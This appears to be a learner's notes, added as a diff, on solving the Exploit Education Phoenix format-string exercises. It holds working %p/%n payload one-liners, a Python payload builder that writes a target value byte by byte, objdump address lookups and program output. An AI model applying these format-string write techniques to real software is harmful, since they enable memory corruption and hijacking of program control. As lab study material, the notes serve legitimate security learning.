@@ -1,0 +1,209 @@
+#####################
+Format Four - 32 bit
+#####################
+Same as format-three, but have to overwrite the return address. And if we want to get our own shell, then at that point it's the same as stack-five.
+We can reuse exploit.py from format-three
+
+objdump -t format-four | grep congratulations
+08048503 g     F .text	00000020 congratulations
+
+congratz - the value we need to write to the saved EIP - is at 0x08048503
+
+
+#####################
+Format Three - 32 bit
+#####################
+I think same exploitation as format-two, but with width controlling characters
+int num_char;
+printf(“%10d%n”, 0, &num_char);
+-> will print "          0", num_char is 10
+
+
+python -c 'print "%p " * 48 + "AAAA"' | ./format-three
+That way, the 0x41414141 is the last address with 48 %p's.
+
+objdump -t format-three | grep changeme
+08049844 g     O .bss	00000004 changeme
+
+changeme is at 0x08049844
+
+Proof of concept:
+python -c 'print "%p " * 47 + "%n " + "\x08\x04\x98\x44"[::-1]' | ./format-three
+Better luck next time - got 0x000001db, wanted 0x64457845!
+
+
+python -c 'print "%p " * 49 + "%100p " + "%n " + "\x08\x04\x98\x44"[::-1]' | ./format-three
+Better luck next time - got 0x00000256, wanted 0x64457845!
+
+1db = 475
+256 = 598
+0x64457845 = 1682274373
+
+Problem:
+Printing out 1682274373 takes fucking forever.
+
+Solution:
+Do it one byte/two bytes at a time.
+printf(“%10d%hn”, 0, &num_char); -> writes 2 bytes to &num_char --> couldn't get that to work for some reason
+
+But I think we can just start writing from the least significant byte (byte with the lowest address, byte at the end) and then just keep overwriting the higher bytes. One byte at a time. 
+Note: We will be overwriting values past the changeme variable. Hope it doesn't break anything.
+
+Note: You can put the address before the %p's. It will make the payload significantly shorter.
+
+I made a script for getting the correct output.
+```
+#!/usr/bin/python3
+
+address1 = "\x08\x04\x98\x44"[::-1]
+address2 = "\x08\x04\x98\x45"[::-1]
+address3 = "\x08\x04\x98\x46"[::-1]
+address4 = "\x08\x04\x98\x47"[::-1]
+
+buf = ''
+buf += address1
+buf += 'AAAA' # Add space for extra padding using %1234p or whatever
+buf += address2
+buf += 'BBBB' # Add space for extra padding
+buf += address3
+buf += 'CCCC' # Add space for extra padding
+buf += address4
+
+buf += '%p ' * 10 # Get to the start of the buffer
+
+buf += '%219p ' # Add extra bytes to %n. It will overflow to 0x45.
+buf += '%n '  # Write the first byte - 0x45
+buf += '%49p '
+buf += '%n ' # Write the second byte - 0x78
+buf += '%203p '
+buf += '%n ' # Write the third byte - 0x45
+buf += '%29p '
+buf += '%n ' # Write the fourth byte - 0x64
+
+print(buf)
+
+```
+
+Exploit with:
+python ~/format/format3/exploit.py | ./format-three
+
+####################
+Format Two - 32 bit
+###################
+Trying to solve it all on my own this time.
+
+./format-two "$(python -c 'print "%p " * 56 + "AAAA"')"
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+0xffffd75d 0x100 0 0xf7f84b67 0xffffd5b0 0xffffd598 0x80485a0 0xffffd490 0xffffd75d 0x100 0x3e8 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x41414141 0 0 AAAABetter luck next time!
+
+It is the 54th parameter
+
+objdump -t format-two | grep changeme
+08049868 g     O .bss	00000004 changeme
+
+The changeme parameter is at 08049868.
+
+
+
+But as you remove the %p's, then the stack addresses also change.
+
+
+./format-two "$(python -c 'print "%p " * 52 + "BBBB\x08\x04\x98\x68AAAA"[::-1]')"
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+0xffffd761 0x100 0 0xf7f84b67 0xffffd5b0 0xffffd598 0x80485a0 0xffffd490 0xffffd761 0x100 0x3e8 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x41414141 0x8049868 AAAAh�BBBBBetter luck next time!
+
+Here we can see that adding 52 %p's will get us in the state that the address is the last thing we print out
+
+So just replace one %p with %n and you will modify the correct address!
+./format-two "$(python -c 'print "%p " * 51 + "%n " + "BBBB\x08\x04\x98\x68AAAA"[::-1]')"
+
+##################
+Format Two - 64bit
+##################
+I think I could theoretically solve it like I solved Format One. But there is a greater risk of segfaults and stuff, the more of the stack you overwrite. I think we should try to use %n
+
+Command:
+./format-two "AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p"
+Output:
+AAAA 0 0x2 0 0x7fffffffe46e 0x7fffffffe3ff 0x7fffffffe440 0x7fffffffe440 0x7fffffffe540 0x400705 0x7fffffffe598 0x200400368 0x2070252041414141 0x7025207025207025 0x2520702520702520
+
+We can see the AAAA is the 12th thing on the stack. Though it doesn't take up the whole 8 bytes, (4 characters is 4 bytes). 
+
+We can get the address of the global changeme variable using objdump.
+objdump -t format-two | grep changeme
+0000000000600af0 g     O .bss	0000000000000004 changeme
+
+./format-two "AAAA %12$p" doesn't work in this case, but we have enough space on the buffer to exploit it anyways.
+
+./format-two "$(python -c 'print "\x00\x00\x00\x00\x00\x60\x0a\xf0"[::-1] + "%p " * 12')"
+Since bash uses C-style strings, it doesn't at all like the NULL bytes in that string in the command substitution. Also C probably won't like them in the string either. So that sucks.
+
+This is an useful syntax to know:
+./format-two $'\x41\x41\x41\x41%p%p%p%p%p%p%p%p%p%p%p%p'
+If you put a NULL byte in the middle, then it will get passed to the C program successfully (but C will still terminate the string at the NULL byte, so you still have a problem.)
+For this exercise, doing it the python way should work as well.
+
+Correct solution from comments at https://blog.lamarranet.com/index.php/exploit-education-phoenix-format-two-solution/:
+./format-two $'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%n\xf0\x0a\x60\x00\x00\x00\x00'
+
+However, this is also the correct solution:
+./format-two $'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%n\xf0\x0a\x60'
+
+I suspect the reason it works is because of this line in the code: 
+memset(buf, 0, sizeof(buf));
+
+If the buffer wasn't nulled out, then I think it would have contained junk bytes, which might fuck everything up.
+
+
+
+Further deliberations:
+./format-two "$(python -c 'print "%p " * 25 + "AAAA"')"
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+0 0x1 0 0x7fffffffe45f 0x7fffffffe3cf 0x7fffffffe410 0x7fffffffe410 0x7fffffffe510 0x400705 0x7fffffffe568 0x200400368 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x41414141207025 0 0 0 0 AAAABetter luck next time!
+
+The 0x41414141 is the 21st parameter.
+
+
+##############
+Format One
+##############
+
+All you have to do compared to format-zero is to just add the address after overwriting the buffer!
+python -c 'print "%32x" + "\x00\x00\x00\x00\x45\x76\x4f\x6c"[::-1]' | ./format-one
+
+
+#############
+Format Zero
+############
+https://blog.lamarranet.com/index.php/exploit-education-phoenix-format-zero-solution/
+
+Changeme is [ebp - local_ch]
+ebp = 0xffffd618
+local_ch = 0xc
+changeme = 0xFFFFD60C # Doublechecked, it's correct.
+
+Question:
+Putting the input: %100x makes it override it with 0x20's for some reason. Why? What does it do?
+
+Answer (What does it do?):
+%100x is not 100 x's. It's 100 bytes of x
+And it's not 100 bytes from the stack, but rather x, padded to 100 bytes. It's padded with spaces.
+More specifically, the beginning of it is padded with spaces.
+
+Answer:
+Ooooh I think I get it!
+
+Buffer is only 16 bytes long, right?
+So we can fill the buffer with %x
+Then, sprintf will print the buffer to locals.dest.
+
+BUT! It will interpret the %x as an 8 byte (for 64-bit, or 4 byte for 32 bit) value that should be taken from the stack!
+So, in a 64 bit process, if the buffer will contain 4 %x's, then actually, 32 bytes will be written to dest! And since it also writes the newline, then locals.changeme will be overwritten
+
+In a 32 bit process we will need 8 %x's, which is more than the buffer can handle, but we can just use the following syntax:
+%32x
+This will print 32 bytes of hexes from the stack.
+The 32 bytes of hex will fill the dest array. Since a newline is also included into the buffer when we write our input, then that will overfill the dest array and overwrite the changeme variable.
+
+The answer is: %32x
+
